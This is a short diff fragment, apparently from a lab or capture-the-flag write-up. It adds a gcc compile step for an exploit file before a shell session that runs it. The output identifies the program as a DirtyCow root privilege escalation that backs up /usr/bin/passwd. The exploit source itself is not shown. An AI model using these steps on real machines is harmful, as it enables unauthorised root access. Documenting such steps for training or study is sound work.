@@ -555,6 +555,10 @@ makke@acid:/tmp$ ls
 exp.c
 systemd-private-da3e213701af484ab358214699ca9ab6-rtkit-daemon.service-VJQr8x
 vmware-root
+makke@acid:/tmp$ gcc -o exp exp.c -pthread
+
+once that's done...
+
 makke@acid:/tmp$ ./exp
 DirtyCow root privilege escalation
 Backing up /usr/bin/passwd.. to /tmp/bak
